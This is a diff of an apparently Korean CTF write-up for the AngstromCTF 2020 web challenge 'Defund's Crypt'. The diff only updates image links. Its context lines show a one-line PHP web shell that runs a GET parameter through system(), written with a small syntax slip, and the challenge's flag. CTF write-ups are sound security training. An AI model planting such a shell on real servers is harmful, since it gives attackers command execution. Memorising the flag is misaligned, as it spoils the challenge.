@@ -6,8 +6,10 @@ tags: [web CTF-Writeups Angstromctf2020]
 ---
 # Defund's Crypt
 ---
-![](https://raw.githubusercontent.com/heogi/heogi.github.io/master/_posts/CTF%20Writeups/angstromctf2020/Defund's%20Crypt/2020-03-20-16-01-23.png)
-![](https://raw.githubusercontent.com/heogi/heogi.github.io/master/_posts/CTF%20Writeups/angstromctf2020/Defund's%20Crypt/2020-03-20-16-01-36.png)
+
+![2020-03-20-16-01-23](https://user-images.githubusercontent.com/45466073/122631471-fd067580-d106-11eb-813d-9fe7d5980b55.png)
+
+![2020-03-20-16-01-36](https://user-images.githubusercontent.com/45466073/122631474-01329300-d107-11eb-9c94-8239de9a4cf7.png)
 
 소스코드가 제공된다.
 ```php
@@ -73,8 +75,8 @@ tags: [web CTF-Writeups Angstromctf2020]
 ```php
 <?php system($_GET('cmd')); ?>
 ```
-![](https://raw.githubusercontent.com/heogi/heogi.github.io/master/_posts/CTF%20Writeups/angstromctf2020/Defund's%20Crypt/2020-03-20-16-18-13.png)
- 
+ ![2020-03-20-16-18-13](https://user-images.githubusercontent.com/45466073/122631476-04c61a00-d107-11eb-92eb-db38b9f38e67.png)
+
 ```text
 actf{th3_ch4ll3ng3_h4s_f4ll3n_but_th3_crypt_rem4ins}
 ```
